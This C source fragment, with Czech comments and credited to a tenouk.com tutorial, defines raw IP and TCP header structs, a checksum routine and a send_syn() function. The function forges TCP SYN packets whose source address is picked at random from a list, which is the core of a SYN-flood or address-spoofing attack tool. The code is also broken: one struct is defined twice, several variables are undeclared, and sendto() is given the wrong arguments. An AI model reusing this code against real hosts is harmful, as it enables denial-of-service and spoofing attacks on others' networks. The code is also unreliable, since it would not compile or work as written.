// struktury a CRC, prevzato z https://www.tenouk.com/Module43a.html

struct ipheader {
    unsigned char      iph_ihl:5, /* Little-endian */
                        iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned char      iph_flags;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

struct ipheader {
    #if BYTE_ORDER == LITTLE_ENDIAN 
    u_char  iph_ihl:4,        /* header length */
            iph_ver:4;         /* version */
    #endif
    #if BYTE_ORDER == BIG_ENDIAN 
    u_char  iph_ver:4,         /* version */
            iph_ihl:4;        /* header length */
    #endif
    u_char  iph_tos;         /* type of service */
    short   iph_len;         /* total length */
    u_short iph_ident;          /* identification */
    short   iph_offset;         /* fragment offset field */
    #define IP_DF 0x4000        /* dont fragment flag */
    #define IP_MF 0x2000        /* more fragments flag */
    u_char  iph_ttl;         /* time to live */
    u_char  iph_protocol;           /* protocol */
    u_short iph_chksum;         /* checksum */
    struct  in_addr iph_sourceip,iph_destip;  /* source and dest address */
};

struct tcpheader {
    unsigned short int tcph_srcport;
    unsigned short int tcph_destport;
    unsigned int       tcph_seqnum;
    unsigned int       tcph_acknum;
    unsigned char      tcph_reserved:4, tcph_offset:4;
    // unsigned char tcph_flags;
    unsigned int
        tcp_res1:4,      /*little-endian*/
        tcph_hlen:4,     /*length of tcp header in 32-bit words*/
        tcph_fin:1,      /*Finish flag "fin"*/
        tcph_syn:1,       /*Synchronize sequence numbers to start a connection*/
        tcph_rst:1,      /*Reset flag */
        tcph_psh:1,      /*Push, sends data to the application*/
        tcph_ack:1,      /*acknowledge*/
        tcph_urg:1,      /*urgent pointer*/
        tcph_res2:2;
    unsigned short int tcph_win;
    unsigned short int tcph_chksum;
    unsigned short int tcph_urgptr;
};

unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum;
    for(sum=0; len>0; len--)
            sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void send_syn(int target_port, char *target_address, char *addresses[], int address_count) {
    struct sockaddr_in spoof;
    // obsah paketu
    char buffer[PCKT_LEN];
    memset(buffer, 0, PCKT_LEN);

    // The size of the headers
    struct ipheader *ip = (struct ipheader *) buffer;
    struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));
    struct sockaddr_in sin, din;
    int one = 1;

    // generate random address
    char *spoofed_address = addresses[rand()%address_count];
    // Address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    // Source port, can be any, modify as needed
    sin.sin_port = htons(spoofed_port);
    din.sin_port = htons(target_port);
    // Source IP, can be any, modify as needed
    sin.sin_addr.s_addr = inet_addr(spoofed_address);
    din.sin_addr.s_addr = inet_addr(target_address);
    // IP structure
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 16;
    ip->iph_len = sizeof(struct ipheader) + sizeof(struct tcpheader);
    ip->iph_ident = htons(13375);
    ip->iph_offset = 0;
    ip->iph_ttl = 64;
    ip->iph_protocol = 6; // TCP
    ip->iph_chksum = 0; // Done by kernel
    ip->iph_sourceip = inet_addr(spoofed_address);
    ip->iph_destip = inet_addr(target_address);
    // The TCP structure. The source port, spoofed, we accept through the command line
    tcp->tcph_srcport = htons(spoofed_port);
    // The destination port, we accept through command line
    tcp->tcph_destport = htons(target_port);
    tcp->tcph_seqnum = htonl(1);
    tcp->tcph_acknum = 0;
    tcp->tcph_offset = 5;
    tcp->tcph_syn = 1;
    tcp->tcph_ack = 0; // ? non zero?
    tcp->tcph_win = htons(32767);
    tcp->tcph_chksum = 0; // Done by kernel
    tcp->tcph_urgptr = 0;
    // IP checksum calculation
    ip->iph_chksum = csum((unsigned short *) buffer, (sizeof(struct ipheader) + sizeof(struct tcpheader)));

    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(STDERR,"setsockopt() error.\n");
        exit(1);
    }

    if(sendto(spoof, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        fprintf(STDERR,"Chyba pri odesilani dat pres socket.\n");
        exit(1);
    }
}